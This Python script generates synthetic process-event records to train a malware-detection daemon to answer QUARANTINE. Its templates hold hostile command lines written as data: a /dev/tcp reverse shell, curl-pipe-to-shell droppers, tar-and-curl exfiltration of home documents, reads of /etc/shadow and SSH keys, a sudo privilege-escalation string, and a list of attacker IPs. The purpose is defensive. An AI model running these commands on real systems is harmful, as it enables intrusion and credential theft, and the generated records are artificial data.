#!/usr/bin/env python3
"""
generate_threats.py — Bucket A generator for jeTT Round 4.

Diverse REAL threats with behavioral proof, verdict QUARANTINE. The point is
*breadth*: Round 3 was ~80% C2, so the model learned "C2 = bad" and little
else. This caps every subcategory so the model sees reverse shells, droppers,
miners, credential theft, persistence, priv-esc, fileless, injection, and
exfil — each carrying the behavioral signals the daemon actually collects.

Input strings are byte-for-byte what src/bin/daemon.rs emits at runtime (same
formatter as generate_false_positive_armor.py). Output is one word: QUARANTINE.

RUN:
    python3 generate_threats.py --count 1500 --out data/bucket_a_threats.jsonl

FORMAT NOTE (real daemon constraint): the event string today carries
name/uid/exe/cmd/time + outbound_connections/sensitive_files/spawned_children
(or behavior:none_observed). It does NOT carry a parent process or a
human-readable hour (time is epoch). So "spawned by sshd at 3am" is not
representable yet — those threats are encoded here through the signals the
daemon CAN see (uid, exe path, sensitive files, outbound, children). When the
event format gains parent/hour, add a generator pass for those.
"""

import argparse
import hashlib
import json
import random
from pathlib import Path

# ---------------------------------------------------------------------------
# DAEMON-EXACT FORMATTER (identical to the Bucket B generator — one dialect)
# ---------------------------------------------------------------------------
TS_MIN = 1749000000
TS_MAX = 1781300000


def behavior_suffix(conns=None, files=None, kids=None):
    parts = ""
    if conns:
        parts += f" outbound_connections:[{','.join(sorted(conns))}]"
    if files:
        parts += f" sensitive_files:[{','.join(sorted(files))}]"
    if kids:
        parts += f" spawned_children:[{','.join(sorted(kids))}]"
    if not parts:
        parts = " behavior:none_observed"
    return parts


def format_guard_event(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
    base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
    return base + behavior_suffix(conns, files, kids)


# ---------------------------------------------------------------------------
# MALICIOUS INDICATOR POOLS
# ---------------------------------------------------------------------------
# Suspicious destinations: Tor exits, bulletproof/VPS ranges, odd ports.
EVIL_IPS = [
    "185.220.101.45", "185.220.102.8", "185.220.100.252",   # Tor exits
    "45.137.21.9", "45.155.205.233", "194.165.16.78",         # bulletproof VPS
    "91.92.109.43", "193.42.33.14", "5.188.206.18",
    "212.193.30.21", "171.25.193.77",
]
C2_PORTS = [4444, 4445, 443, 8443, 1337, 9001, 53, 6667]
POOL_PORTS = [3333, 4444, 5555, 14444, 45700, 7777]

EVIL_EXE_DIRS = ["/tmp/", "/dev/shm/", "/var/tmp/", "/tmp/.cache/",
                 "/home/cosmic/.cache/", "/run/user/1000/"]
HIDDEN_NAMES = [".x", ".sysupdate", ".kworker", ".systemd-priv", ".dbus-x",
                "kworkerd", "systemd-resolv", ".update", ".a", "crond"]

SENSITIVE = ["/etc/shadow", "/etc/passwd", "/etc/sudoers",
             "/home/cosmic/.ssh/id_rsa", "/home/cosmic/.ssh/authorized_keys",
             "/home/cosmic/.aws/credentials", "/root/.ssh/id_rsa",
             "/home/cosmic/.config/gcloud/credentials.db"]


def evil_conn(ports):
    return f"{random.choice(EVIL_IPS)}:{random.choice(ports)}"


def evil_exe():
    return random.choice(EVIL_EXE_DIRS) + random.choice(HIDDEN_NAMES)


# ---------------------------------------------------------------------------
# THREAT TEMPLATES — each is a category family. Generator rotates pid/uid/time
# and the behavioral payload. Verdict is always QUARANTINE; the SIGNAL is
# always present (a clean threat teaches nothing).
# ---------------------------------------------------------------------------

def _conns(ports, lo=1, hi=2):
    return lambda: [evil_conn(ports) for _ in range(random.randint(lo, hi))]


def _files(lo=1, hi=2):
    return lambda: random.sample(SENSITIVE, k=random.randint(lo, hi))


TEMPLATES = [
    # --- Reverse shell / C2 -------------------------------------------------
    dict(category="reverse_shell", name=lambda: random.choice(HIDDEN_NAMES),
         exe=evil_exe, uid=[1000, 0],
         cmds=["-e /bin/bash {ip} {port}", "-i", "bash -i >& /dev/tcp/{ip}/{port} 0>&1"],
         conns=_conns(C2_PORTS, 1, 1), kids=lambda: random.sample(["bash", "sh"], k=1),
         mitre=["T1059.004", "T1071"], tags=["reverse_shell", "outbound_c2", "shell_child"],
         reasoning="Process in a temp dir opening an interactive shell back to a non-local IP — classic reverse shell."),
    dict(category="c2_beacon", name=lambda: random.choice([".sysupdate", "systemd-resolv"]),
         exe=evil_exe, uid=[1000],
         cmds=["--beacon {ip}:{port}", "-c {ip}", ""],
         conns=_conns(C2_PORTS, 1, 3),
         mitre=["T1071.001", "T1573"], tags=["beaconing", "outbound_c2", "hidden_name"],
         reasoning="Hidden-named binary beaconing on a regular interval to a suspicious host — C2 implant."),

    # --- Dropper / staging --------------------------------------------------
    dict(category="dropper", name=lambda: random.choice(["curl", "wget", "sh"]),
         exe=lambda: random.choice(["/usr/bin/curl", "/usr/bin/wget", "/bin/sh"]), uid=[1000],
         cmds=["-fsSL http://{ip}:{port}/x.sh", "http://{ip}/payload -O /tmp/.x", "-c 'curl {ip}|sh'"],
         conns=_conns([80, 8080, 443], 1, 1),
         files=lambda: ["/tmp/.x"] if random.random() < 0.6 else None,
         kids=lambda: random.sample(["sh", "bash", "chmod"], k=random.randint(1, 2)),
         mitre=["T1105", "T1027"], tags=["pipe_to_shell", "writes_tmp", "downloads"],
         reasoning="Download-and-execute: fetches a remote payload to /tmp and pipes it to a shell."),

    # --- Miner --------------------------------------------------------------
    dict(category="cryptominer", name=lambda: random.choice([".kworker", "kworkerd", ".xmr"]),
         exe=evil_exe, uid=[1000, 0],
         cmds=["--algo rx/0 -o {ip}:{port} -u worker", "-o stratum+tcp://{ip}:{port}", "--cpu-priority 5"],
         conns=_conns(POOL_PORTS, 1, 1),
         mitre=["T1496"], tags=["mining_pool", "hidden_name", "cpu_abuse"],
         reasoning="Hidden process connecting to a mining-pool port with mining flags — cryptojacking."),

    # --- Credential theft ---------------------------------------------------
    dict(category="credential_theft", name=lambda: random.choice(["cat", "cp", ".x", "python3"]),
         exe=evil_exe, uid=[0, 1000],
         cmds=["/etc/shadow", "-r ~/.ssh/", "-c 'open(\"/etc/shadow\").read()'"],
         files=_files(2, 3),
         conns=lambda: [evil_conn([443])] if random.random() < 0.5 else None,
         mitre=["T1003", "T1552.001"], tags=["reads_shadow", "reads_ssh_keys", "possible_exfil"],
         reasoning="Reads multiple credential stores (shadow, SSH keys) and may exfiltrate — credential theft."),

    # --- Persistence --------------------------------------------------------
    dict(category="persistence", name=lambda: random.choice(["sh", "bash", "tee", "crontab"]),
         exe=lambda: random.choice(["/bin/sh", "/bin/bash", "/usr/bin/crontab"]), uid=[0, 1000],
         cmds=["-c 'echo ... >> /etc/cron.d/x'", "-e", "install /etc/systemd/system/x.service"],
         files=lambda: random.sample(
             ["/etc/cron.d/.x", "/etc/systemd/system/update.service",
              "/home/cosmic/.bashrc", "/home/cosmic/.config/autostart/x.desktop"],
             k=random.randint(1, 2)),
         mitre=["T1053.003", "T1543.002", "T1547"], tags=["writes_cron", "writes_unit", "autostart"],
         reasoning="Writes a cron job / systemd unit / autostart entry to survive reboot — persistence."),

    # --- Privilege escalation ----------------------------------------------
    dict(category="privilege_escalation", name=lambda: random.choice(["pkexec", "sudo", ".x", "sh"]),
         exe=lambda: random.choice(["/usr/bin/pkexec", evil_exe()]), uid=[1000],
         cmds=["", "-u#-1 id", "/bin/sh -p"],
         files=lambda: ["/etc/sudoers", "/etc/shadow"][: random.randint(1, 2)] if random.random() < 0.6 else None,
         kids=lambda: ["bash", "sh"][: 1],
         mitre=["T1068", "T1548.003"], tags=["suid_abuse", "uid_transition", "spawns_root_shell"],
         reasoning="Abuses a SUID/sudo path to spawn a privileged shell from an unprivileged uid — priv-esc."),

    # --- Fileless / memfd ---------------------------------------------------
    dict(category="fileless", name=lambda: random.choice([".", "bash", "python3"]),
         exe=lambda: random.choice(["memfd:x (deleted)", "/tmp/.x (deleted)", "/proc/self/exe (deleted)"]),
         uid=[1000, 0], cmds=["", "-c '...'"],
         conns=lambda: [evil_conn(C2_PORTS)] if random.random() < 0.6 else None,
         mitre=["T1620", "T1059"], tags=["memfd", "deleted_exe", "fileless"],
         reasoning="Executing from an in-memory/deleted image with no on-disk binary — fileless execution."),

    # --- Injection ----------------------------------------------------------
    dict(category="injection", name=lambda: random.choice([".x", "gdb", "python3"]),
         exe=evil_exe, uid=[1000, 0],
         cmds=["-p {pid} --ptrace", "-c 'ctypes.CDLL(...)'", "inject /tmp/.so"],
         kids=lambda: ["sh"] if random.random() < 0.4 else None,
         conns=lambda: [evil_conn(C2_PORTS)] if random.random() < 0.4 else None,
         mitre=["T1055"], tags=["ptrace", "dlopen_tmp", "process_injection"],
         reasoning="Uses ptrace/dlopen from a temp path to inject into another process — process injection."),

    # --- Exfiltration -------------------------------------------------------
    dict(category="exfiltration", name=lambda: random.choice(["tar", "curl", "python3", ".x"]),
         exe=lambda: random.choice(["/usr/bin/tar", "/usr/bin/curl", evil_exe()]), uid=[1000, 0],
         cmds=["czf - /home/cosmic/Documents | curl -T - {ip}", "--data-binary @/tmp/.dump {ip}"],
         files=_files(1, 2),
         conns=_conns([443, 80, 8080], 1, 1),
         mitre=["T1041", "T1567.002"], tags=["reads_sensitive", "bulk_outbound", "archive_then_send"],
         reasoning="Reads sensitive data, archives it, and pushes it to an external host — exfiltration."),
]


def rand_pid():
    return random.randint(800, 199999)


def resolve(v):
    return v() if callable(v) else v


def make_record(t):
    name = resolve(t["name"])
    exe = resolve(t["exe"])
    uid = random.choice(t["uid"]) if isinstance(t.get("uid"), list) else resolve(t.get("uid", 1000))
    cmd = random.choice(t["cmds"]) if t.get("cmds") else ""
    ts = random.randint(TS_MIN, TS_MAX)

    conns = resolve(t.get("conns")) if "conns" in t else None
    files = resolve(t.get("files")) if "files" in t else None
    kids = resolve(t.get("kids")) if "kids" in t else None

    # fill {ip}/{port}/{pid} placeholders in cmd from the chosen payload
    ip = (conns[0].rsplit(":", 1)[0] if conns else random.choice(EVIL_IPS))
    port = (conns[0].rsplit(":", 1)[1] if conns else str(random.choice(C2_PORTS)))
    cmd = cmd.replace("{ip}", ip).replace("{port}", port).replace("{pid}", str(rand_pid()))

    inp = format_guard_event(name, rand_pid(), uid, exe, cmd, ts,
                             conns=conns, files=files, kids=kids)
    return {
        "bucket": "threat",
        "category": t["category"],
        "mitre": t.get("mitre", []),
        "tags": t.get("tags", []),
        "input": inp,
        "output": "QUARANTINE",
        "reasoning": t.get("reasoning", ""),
    }


def main():
    ap = argparse.ArgumentParser(description="jeTT Round 4 — Bucket A (diverse threats) generator")
    ap.add_argument("--count", type=int, default=1500)
    ap.add_argument("--out", default="data/bucket_a_threats.jsonl")
    ap.add_argument("--seed", type=int, default=None)
    args = ap.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)

    seen, written, attempts = set(), 0, 0
    max_attempts = args.count * 50
    by_cat = {}
    with out.open("w") as f:
        while written < args.count and attempts < max_attempts:
            attempts += 1
            rec = make_record(random.choice(TEMPLATES))
            h = hashlib.sha1(rec["input"].encode()).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            f.write(json.dumps(rec) + "\n")
            written += 1
            by_cat[rec["category"]] = by_cat.get(rec["category"], 0) + 1

    print(f"wrote {written} records to {out}")
    if written < args.count:
        print(f"  (dedup exhausted template variety at {written}; add templates or lower --count)")
    print("category distribution (want: spread, no single one dominating):")
    for c, n in sorted(by_cat.items(), key=lambda x: -x[1]):
        print(f"  {n:5d}  {c}")


if __name__ == "__main__":
    main()
